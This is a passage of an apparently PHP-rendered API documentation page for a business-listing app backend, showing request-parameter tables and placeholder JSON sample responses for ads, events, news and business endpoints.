                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">image</span>: <span class="type-string">"</span><a href="http://localhost/apps/businessapp/uploads/ads/3.jpg">http://localhost/apps/businessapp/uploads/ads/3.jpg</a><span class="type-string">"</span></div>
                                                                        </li>
                                                                    </ul>
                                                                    },
                                                                </div>
                                                            </li>
                                                            <li>
                                                                <div class="hoverable">
                                                                    <div class="collapser"></div>
                                                                    {<span class="ellipsis"></span>
                                                                    <ul class="obj collapsible">
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">id</span>: <span class="type-string">"3"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">title</span>: <span class="type-string">"Test-3"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">description</span>: <span class="type-string">"this is test add"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">special</span>: <span class="type-string">"0"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">enddate</span>: <span class="type-string">"05/25/2016"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">address</span>: <span class="type-string">"Ahmedabad"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">image</span>: <span class="type-string">"</span><a href="http://localhost/apps/businessapp/uploads/ads/4.jpg">http://localhost/apps/businessapp/uploads/ads/4.jpg</a><span class="type-string">"</span></div>
                                                                        </li>
                                                                    </ul>
                                                                    },
                                                                </div>
                                                            </li>
                                                            <li>
                                                                <div class="hoverable">
                                                                    <div class="collapser"></div>
                                                                    {<span class="ellipsis"></span>
                                                                    <ul class="obj collapsible">
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">id</span>: <span class="type-string">"4"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">title</span>: <span class="type-string">"Test-4"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">description</span>: <span class="type-string">"this is test add"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">special</span>: <span class="type-string">"0"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">enddate</span>: <span class="type-string">"05/25/2016"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">address</span>: <span class="type-string">"Ahmedabad"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">image</span>: <span class="type-string">"</span><a href="http://localhost/apps/businessapp/uploads/ads/5.jpg">http://localhost/apps/businessapp/uploads/ads/5.jpg</a><span class="type-string">"</span></div>
                                                                        </li>
                                                                    </ul>
                                                                    },
                                                                </div>
                                                            </li>
                                                            <li>
                                                                <div class="hoverable">
                                                                    <div class="collapser"></div>
                                                                    {<span class="ellipsis"></span>
                                                                    <ul class="obj collapsible">
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">id</span>: <span class="type-string">"5"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">title</span>: <span class="type-string">"Test-5"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">description</span>: <span class="type-string">"this is test add"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">special</span>: <span class="type-string">"0"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">enddate</span>: <span class="type-string">"05/25/2016"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">address</span>: <span class="type-string">"Ahmedabad"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">image</span>: <span class="type-string">"</span><a href="http://localhost/apps/businessapp/uploads/ads/6.jpg">http://localhost/apps/businessapp/uploads/ads/6.jpg</a><span class="type-string">"</span></div>
                                                                        </li>
                                                                    </ul>
                                                                    }
                                                                </div>
                                                            </li>
                                                        </ul>
                                                        ],
                                                    </div>
                                                </li>
                                                <li>
                                                    <div class="hoverable">
                                                        <span class="property">halfads</span>:
                                                        <div class="collapser"></div>
                                                        [<span class="ellipsis"></span>
                                                        <ul class="array collapsible">
                                                            <li>
                                                                <div class="hoverable">
                                                                    <div class="collapser"></div>
                                                                    {<span class="ellipsis"></span>
                                                                    <ul class="obj collapsible">
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">id</span>: <span class="type-string">"18"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">title</span>: <span class="type-string">"Test-18"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">description</span>: <span class="type-string">"this is test add"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">special</span>: <span class="type-string">"0"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">enddate</span>: <span class="type-string">"05/25/2016"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">address</span>: <span class="type-string">"Ahmedabad"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">image</span>: <span class="type-string">"</span><a href="http://localhost/apps/businessapp/uploads/ads/11.jpg">http://localhost/apps/businessapp/uploads/ads/11.jpg</a><span class="type-string">"</span></div>
                                                                        </li>
                                                                    </ul>
                                                                    },
                                                                </div>
                                                            </li>
                                                            <li>
                                                                <div class="hoverable">
                                                                    <div class="collapser"></div>
                                                                    {<span class="ellipsis"></span>
                                                                    <ul class="obj collapsible">
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">id</span>: <span class="type-string">"19"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">title</span>: <span class="type-string">"Test-19"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">description</span>: <span class="type-string">"this is test add"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">special</span>: <span class="type-string">"0"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">enddate</span>: <span class="type-string">"05/25/2016"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">address</span>: <span class="type-string">"Ahmedabad"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">image</span>: <span class="type-string">"</span><a href="http://localhost/apps/businessapp/uploads/ads/12.jpg">http://localhost/apps/businessapp/uploads/ads/12.jpg</a><span class="type-string">"</span></div>
                                                                        </li>
                                                                    </ul>
                                                                    },
                                                                </div>
                                                            </li>
                                                            <li>
                                                                <div class="hoverable">
                                                                    <div class="collapser"></div>
                                                                    {<span class="ellipsis"></span>
                                                                    <ul class="obj collapsible">
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">id</span>: <span class="type-string">"20"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">title</span>: <span class="type-string">"Test-20"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">description</span>: <span class="type-string">"this is test add"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">special</span>: <span class="type-string">"0"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">enddate</span>: <span class="type-string">"05/25/2016"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">address</span>: <span class="type-string">"Ahmedabad"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">image</span>: <span class="type-string">"</span><a href="http://localhost/apps/businessapp/uploads/ads/13.jpg">http://localhost/apps/businessapp/uploads/ads/13.jpg</a><span class="type-string">"</span></div>
                                                                        </li>
                                                                    </ul>
                                                                    },
                                                                </div>
                                                            </li>
                                                            <li>
                                                                <div class="hoverable">
                                                                    <div class="collapser"></div>
                                                                    {<span class="ellipsis"></span>
                                                                    <ul class="obj collapsible">
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">id</span>: <span class="type-string">"21"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">title</span>: <span class="type-string">"Test-21"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">description</span>: <span class="type-string">"this is test add"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">special</span>: <span class="type-string">"0"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">enddate</span>: <span class="type-string">"05/25/2016"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">address</span>: <span class="type-string">"Ahmedabad"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">image</span>: <span class="type-string">"</span><a href="http://localhost/apps/businessapp/uploads/ads/14.jpg">http://localhost/apps/businessapp/uploads/ads/14.jpg</a><span class="type-string">"</span></div>
                                                                        </li>
                                                                    </ul>
                                                                    },
                                                                </div>
                                                            </li>
                                                            <li>
                                                                <div class="hoverable">
                                                                    <div class="collapser"></div>
                                                                    {<span class="ellipsis"></span>
                                                                    <ul class="obj collapsible">
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">id</span>: <span class="type-string">"22"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">title</span>: <span class="type-string">"Test-22"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">description</span>: <span class="type-string">"this is test add"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">special</span>: <span class="type-string">"0"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">enddate</span>: <span class="type-string">"05/25/2016"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">address</span>: <span class="type-string">"Ahmedabad"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">image</span>: <span class="type-string">"</span><a href="http://localhost/apps/businessapp/uploads/ads/15.jpg">http://localhost/apps/businessapp/uploads/ads/15.jpg</a><span class="type-string">"</span></div>
                                                                        </li>
                                                                    </ul>
                                                                    }
                                                                </div>
                                                            </li>
                                                        </ul>
                                                        ]
                                                    </div>
                                                </li>
                                            </ul>
                                            }
                                        </div>
                                    </li>
                                </ul>
                                }
                            </div>
                        </div>
                        <h6>
                            <i class="fa fa-hand-o-right"></i> Error (Some required data not posted)
                        </h6>
                        <div class="highlight-js json">
                            <div class="collapser"></div>
                            {
                            <span class="ellipsis"></span>
                            <ul class="obj collapsible">
                                <li>
                                    <div class="hoverable">
                                        <span class="property">code</span>:
                                        <span class="type-number">400</span>,
                                    </div>
                                </li>
                                <li>
                                    <div class="hoverable">
                                        <span class="property">status</span>:
                                        <span class="type-string">"error"</span>,
                                    </div>
                                </li>
                                <li>
                                    <div class="hoverable">
                                        <span class="property">message</span>:
                                        <span class="type-string">"Bad Request"</span>
                                    </div>
                                </li>
                            </ul>
                            }
                        </div>
                    </div>
                    <div class="section" id="events">
                        <h2>Events
                            <a class="headerlink" href="index.php#events" title="Permalink to this headline">¶</a>
                            <a href="<?php echo $formpath.'events.php'?>" target="_blank" class="html_link">HTML Form</a>
                        </h2>
                        <p>Events</p>
                        <h5>API LINK</h5>
                        <div class="highlight-text">
                            <div class="highlight">
                                <pre><?php echo $apipath.'/event/get';?></pre>
                            </div>
                        </div>
                        <h5>Request Parameters</h5>
                        <div class="wy-table-responsive">
                            <table border="1" class="docutils">
                                <colgroup>
                                    <col width="35%">
                                    <col width="30%">
                                    <col width="">
                                </colgroup>
                                <thead valign="bottom">
                                <tr class="row-odd">
                                    <th class="head">Param</th>
                                    <th class="head">Required/Optional</th>
                                    <th class="head">Description</th>
                                </tr>
                                </thead>
                                <tbody valign="top">
                                <tr class="row-even">
                                    <td>userid </td>
                                    <td>Required</td>
                                    <td></td>
                                </tr>
                                <tr class="row-even">
                                    <td>cityID </td>
                                    <td>optional</td>
                                    <td></td>
                                </tr>
                                </tbody>
                            </table>
                        </div>
                        <h5>Response</h5>
                        <h6>
                            <i class="fa fa-hand-o-right"></i> Success
                        </h6>
                        <div class="highlight-js json">
                            <div id="json">
                                <div class="collapser"></div>
                                {<span class="ellipsis"></span>
                                <ul class="obj collapsible">
                                    <li>
                                        <div class="hoverable"><span class="property">code</span>: <span class="type-number">200</span>,</div>
                                    </li>
                                    <li>
                                        <div class="hoverable"><span class="property">status</span>: <span class="type-string">"success"</span>,</div>
                                    </li>
                                    <li>
                                        <div class="hoverable">
                                            <span class="property">data</span>:
                                            <div class="collapser"></div>
                                            {<span class="ellipsis"></span>
                                            <ul class="obj collapsible">
                                                <li>
                                                    <div class="hoverable">
                                                        <span class="property">events</span>:
                                                        <div class="collapser"></div>
                                                        [<span class="ellipsis"></span>
                                                        <ul class="array collapsible">
                                                            <li>
                                                                <div class="hoverable">
                                                                    <div class="collapser"></div>
                                                                    {<span class="ellipsis"></span>
                                                                    <ul class="obj collapsible">
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">id</span>: <span class="type-string">"1"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">name</span>: <span class="type-string">"Test"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">description</span>: <span class="type-string">"this is test"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable hovered"><span class="property">datetime</span>: <span class="type-string">"1470934819"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">location</span>: <span class="type-string">"Ahmedabad"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">latitude</span>: <span class="type-string">"23"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">longitude</span>: <span class="type-string">"72"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">totallike</span>: <span class="type-string">"0"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">totalshare</span>: <span class="type-string">"0"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">createdby</span>: <span class="type-string">"Tony"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">islike</span>: <span class="type-string">"n"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable">
                                                                                <span class="property">image</span>:
                                                                                <div class="collapser"></div>
                                                                                [<span class="ellipsis"></span>
                                                                                <ul class="array collapsible">
                                                                                    <li>
                                                                                        <div class="hoverable"><span class="type-string">"</span><a href="http://localhost/apps/businessapp/event/1.jpg">http://localhost/apps/businessapp/event/1.jpg</a><span class="type-string">"</span></div>
                                                                                    </li>
                                                                                </ul>
                                                                                ]
                                                                            </div>
                                                                        </li>
                                                                    </ul>
                                                                    },
                                                                </div>
                                                            </li>
                                                            <li>
                                                                <div class="hoverable">
                                                                    <div class="collapser"></div>
                                                                    {<span class="ellipsis"></span>
                                                                    <ul class="obj collapsible">
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">id</span>: <span class="type-string">"2"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">name</span>: <span class="type-string">"Rock @band"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">description</span>: <span class="type-string">"this is test"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">datetime</span>: <span class="type-string">"1470934819"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">location</span>: <span class="type-string">"Ahmedabad"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">latitude</span>: <span class="type-string">"23"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">longitude</span>: <span class="type-string">"72"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">totallike</span>: <span class="type-string">"0"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">totalshare</span>: <span class="type-string">"0"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">createdby</span>: <span class="type-string">"Rocky"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">islike</span>: <span class="type-string">"n"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable">
                                                                                <span class="property">image</span>:
                                                                                <div class="collapser"></div>
                                                                                [<span class="ellipsis"></span>
                                                                                <ul class="array collapsible">
                                                                                    <li>
                                                                                        <div class="hoverable"><span class="type-string">"</span><a href="http://localhost/apps/businessapp/event/1.jpg">http://localhost/apps/businessapp/event/1.jpg</a><span class="type-string">"</span></div>
                                                                                    </li>
                                                                                </ul>
                                                                                ]
                                                                            </div>
                                                                        </li>
                                                                    </ul>
                                                                    }
                                                                </div>
                                                            </li>
                                                        </ul>
                                                        ],
                                                    </div>
                                                </li>
                                                <li>
                                                    <div class="hoverable"><span class="property">islast</span>: <span class="type-string">"n"</span></div>
                                                </li>
                                            </ul>
                                            }
                                        </div>
                                    </li>
                                </ul>
                                }
                            </div>
                        </div>
                        <h6>
                            <i class="fa fa-hand-o-right"></i> Error (Some required data not posted)
                        </h6>
                        <div class="highlight-js json">
                            <div class="collapser"></div>
                            {
                            <span class="ellipsis"></span>
                            <ul class="obj collapsible">
                                <li>
                                    <div class="hoverable">
                                        <span class="property">code</span>:
                                        <span class="type-number">400</span>,
                                    </div>
                                </li>
                                <li>
                                    <div class="hoverable">
                                        <span class="property">status</span>:
                                        <span class="type-string">"error"</span>,
                                    </div>
                                </li>
                                <li>
                                    <div class="hoverable">
                                        <span class="property">message</span>:
                                        <span class="type-string">"Bad Request"</span>
                                    </div>
                                </li>
                            </ul>
                            }
                        </div>
                    </div>
                    <div class="section" id="news">
                        <h2>News
                            <a class="headerlink" href="index.php#news" title="Permalink to this headline">¶</a>
                            <a href="<?php echo $formpath.'news.php'?>" target="_blank" class="html_link">HTML Form</a>
                        </h2>
                        <p>News Listing</p>
                        <h5>API LINK</h5>
                        <div class="highlight-text">
                            <div class="highlight">
                                <pre><?php echo $apipath.'/news/get';?></pre>
                            </div>
                        </div>
                        <h5>Request Parameters</h5>
                        <div class="wy-table-responsive">
                            <table border="1" class="docutils">
                                <colgroup>
                                    <col width="35%">
                                    <col width="30%">
                                    <col width="">
                                </colgroup>
                                <thead valign="bottom">
                                <tr class="row-odd">
                                    <th class="head">Param</th>
                                    <th class="head">Required/Optional</th>
                                    <th class="head">Description</th>
                                </tr>
                                </thead>
                                <tbody valign="top">
                                <tr class="row-even">
                                    <td>userid </td>
                                    <td>Required</td>
                                    <td></td>
                                </tr>
                                <tr class="row-even">
                                    <td>cityID </td>
                                    <td>Required</td>
                                    <td></td>
                                </tr>
                                </tbody>
                            </table>
                        </div>
                        <h5>Response</h5>
                        <h6>
                            <i class="fa fa-hand-o-right"></i> Success
                        </h6>
                        <div class="highlight-js json">
                            <div id="json">
                                <div class="collapser"></div>
                                {<span class="ellipsis"></span>
                                <ul class="obj collapsible">
                                    <li>
                                        <div class="hoverable"><span class="property">code</span>: <span class="type-number">200</span>,</div>
                                    </li>
                                    <li>
                                        <div class="hoverable"><span class="property">status</span>: <span class="type-string">"success"</span>,</div>
                                    </li>
                                    <li>
                                        <div class="hoverable">
                                            <span class="property">data</span>:
                                            <div class="collapser"></div>
                                            {<span class="ellipsis"></span>
                                            <ul class="obj collapsible">
                                                <li>
                                                    <div class="hoverable">
                                                        <span class="property">news</span>:
                                                        <div class="collapser"></div>
                                                        [<span class="ellipsis"></span>
                                                        <ul class="array collapsible">
                                                            <li>
                                                                <div class="hoverable">
                                                                    <div class="collapser"></div>
                                                                    {<span class="ellipsis"></span>
                                                                    <ul class="obj collapsible">
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">id</span>: <span class="type-string">"1"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">title</span>: <span class="type-string">"Reliance Jio Plans List, Including Ones Mukesh Ambani Didn't Show on Stage"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">description</span>: <span class="type-string">"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">date</span>: <span class="type-string">"Thursday 11 Aug"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">time</span>: <span class="type-string">"pm 5:00"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable hovered"><span class="property">category</span>: <span class="type-string">"Education"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">image</span>: <span class="type-string">"</span><a href="http://imobcreator.com/android_apps/businessapp/uploads/news/1.jpeg">http://imobcreator.com/android_apps/businessapp/uploads/news/1.jpeg</a><span class="type-string">"</span></div>
                                                                        </li>
                                                                    </ul>
                                                                    }
                                                                </div>
                                                            </li>
                                                        </ul>
                                                        ],
                                                    </div>
                                                </li>
                                                <li>
                                                    <div class="hoverable"><span class="property">islast</span>: <span class="type-string">"n"</span></div>
                                                </li>
                                            </ul>
                                            }
                                        </div>
                                    </li>
                                </ul>
                                }
                            </div>
                        </div>
                        <h6>
                            <i class="fa fa-hand-o-right"></i> Error (Some required data not posted)
                        </h6>
                        <div class="highlight-js json">
                            <div class="collapser"></div>
                            {
                            <span class="ellipsis"></span>
                            <ul class="obj collapsible">
                                <li>
                                    <div class="hoverable">
                                        <span class="property">code</span>:
                                        <span class="type-number">400</span>,
                                    </div>
                                </li>
                                <li>
                                    <div class="hoverable">
                                        <span class="property">status</span>:
                                        <span class="type-string">"error"</span>,
                                    </div>
                                </li>
                                <li>
                                    <div class="hoverable">
                                        <span class="property">message</span>:
                                        <span class="type-string">"Bad Request"</span>
                                    </div>
                                </li>
                            </ul>
                            }
                        </div>
                    </div>
                    <div class="section" id="business">
                        <h2>Business
                            <a class="headerlink" href="index.php#business" title="Permalink to this headline">¶</a>
                            <a href="<?php echo $formpath.'business.php'?>" target="_blank" class="html_link">HTML Form</a>
                        </h2>
                        <p>Business Listing</p>
                        <h5>API LINK</h5>
                        <div class="highlight-text">
                            <div class="highlight">
                                <pre><?php echo $apipath.'/business/get';?></pre>
                            </div>
                        </div>
                        <h5>Request Parameters</h5>
                        <div class="wy-table-responsive">
                            <table border="1" class="docutils">
                                <colgroup>
                                    <col width="35%">
                                    <col width="30%">
                                    <col width="">
                                </colgroup>
                                <thead valign="bottom">
                                <tr class="row-odd">
                                    <th class="head">Param</th>
                                    <th class="head">Required/Optional</th>
                                    <th class="head">Description</th>
                                </tr>
                                </thead>
                                <tbody valign="top">
                                <tr class="row-even">
                                    <td>userid</td>
                                    <td>Required</td>
                                    <td></td>
                                </tr>
                                <tr class="row-even">
                                    <td>start </td>
                                    <td>Optional</td>
                                    <td></td>
                                </tr>
                                <tr class="row-even">
                                    <td>limit</td>
                                    <td>Optional</td>
                                    <td></td>
                                </tr>
                                <tr class="row-even">
                                    <td>cityID</td>
                                    <td>Optional</td>
                                    <td></td>
                                </tr>
                                </tbody>
                            </table>
                        </div>
                        <h5>Response</h5>
                        <h6>
                            <i class="fa fa-hand-o-right"></i> Success
                        </h6>
                        <div class="highlight-js json">
                            <div id="json">
                                <div class="collapser"></div>
                                {<span class="ellipsis"></span>
                                <ul class="obj collapsible">
                                    <li>
                                        <div class="hoverable"><span class="property">code</span>: <span class="type-number">200</span>,</div>
                                    </li>
                                    <li>
                                        <div class="hoverable"><span class="property">status</span>: <span class="type-string">"success"</span>,</div>
                                    </li>
                                    <li>
                                        <div class="hoverable">
                                            <span class="property">data</span>:
                                            <div class="collapser"></div>
                                            {<span class="ellipsis"></span>
                                            <ul class="obj collapsible">
                                                <li>
                                                    <div class="hoverable">
                                                        <span class="property">business</span>:
                                                        <div class="collapser"></div>
                                                        [<span class="ellipsis"></span>
                                                        <ul class="array collapsible">
                                                            <li>
                                                                <div class="hoverable">
                                                                    <div class="collapser"></div>
                                                                    {<span class="ellipsis"></span>
                                                                    <ul class="obj collapsible">
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">id</span>: <span class="type-string">"1"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">name</span>: <span class="type-string">"Business-1"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">description</span>: <span class="type-string">"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">since</span>: <span class="type-string">"1995"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">datetime</span>: <span class="type-string">"2016-08-11 19:00:19"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">location</span>: <span class="type-string">"Ahmedabad"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">phone</span>: <span class="type-string">"1234567890"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable hovered"><span class="property">email</span>: <span class="type-string">"manager1@gmail.com"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">qrcode</span>: <span class="type-string">"</span><a href="http://localhost/apps/businessapp/qrcode/B-1.png">http://localhost/apps/businessapp/qrcode/B-1.png</a><span class="type-string">"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">latitude</span>: <span class="type-string">"23"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">longitude</span>: <span class="type-string">"72"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">totallike</span>: <span class="type-string">"5"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">ratingavg</span>: <span class="type-string">"4"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">createdby</span>: <span class="type-string">"Tony"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">working_hours</span>: <span class="type-string">"Mon-Sat  10AM-10PM"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">category</span>: <span class="type-string">"Meetups"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable">
                                                                                <span class="property">image</span>:
                                                                                <div class="collapser"></div>
                                                                                [<span class="ellipsis"></span>
                                                                                <ul class="array collapsible">
                                                                                    <li>
                                                                                        <div class="hoverable"><span class="type-string">"</span><a href="http://localhost/apps/businessapp/uploads/business/1.jpg">http://localhost/apps/businessapp/uploads/business/1.jpg</a><span class="type-string">"</span></div>
                                                                                    </li>
                                                                                </ul>
                                                                                ]
                                                                            </div>
                                                                        </li>
                                                                    </ul>
                                                                    }
                                                                </div>
                                                            </li>
                                                        </ul>
                                                        ],
                                                    </div>
                                                </li>
                                                <li>
                                                    <div class="hoverable"><span class="property">islast</span>: <span class="type-string">"y"</span></div>
                                                </li>
                                            </ul>
                                            }
                                        </div>
                                    </li>
                                </ul>
                                }
                            </div>
                        </div>
                        <h6>
                            <i class="fa fa-hand-o-right"></i> Error (Some required data not posted)
                        </h6>
                        <div class="highlight-js json">
                            <div class="collapser"></div>
                            {
                            <span class="ellipsis"></span>
                            <ul class="obj collapsible">
                                <li>
                                    <div class="hoverable">
                                        <span class="property">code</span>:
                                        <span class="type-number">400</span>,
                                    </div>
                                </li>
                                <li>
                                    <div class="hoverable">
                                        <span class="property">status</span>:
                                        <span class="type-string">"error"</span>,
                                    </div>
                                </li>
                                <li>
                                    <div class="hoverable">
                                        <span class="property">message</span>:
                                        <span class="type-string">"Bad Request"</span>
                                    </div>
                                </li>
                            </ul>
                            }
                        </div>
                    </div>
                    <div class="section" id="map">
                        <h2>Map
                            <a class="headerlink" href="index.php#map" title="Permalink to this headline">¶</a>
                            <a href="<?php echo $formpath.'map.php'?>" target="_blank" class="html_link">HTML Form</a>
                        </h2>
                        <p>City Map</p>
                        <h5>API LINK</h5>
                        <div class="highlight-text">
                            <div class="highlight">
                                <pre><?php echo $apipath.'/map/get';?></pre>
                            </div>
                        </div>
                        <h5>Request Parameters</h5>
                        <div class="wy-table-responsive">
                            <table border="1" class="docutils">
                                <colgroup>
                                    <col width="35%">
                                    <col width="30%">
                                    <col width="">
                                </colgroup>
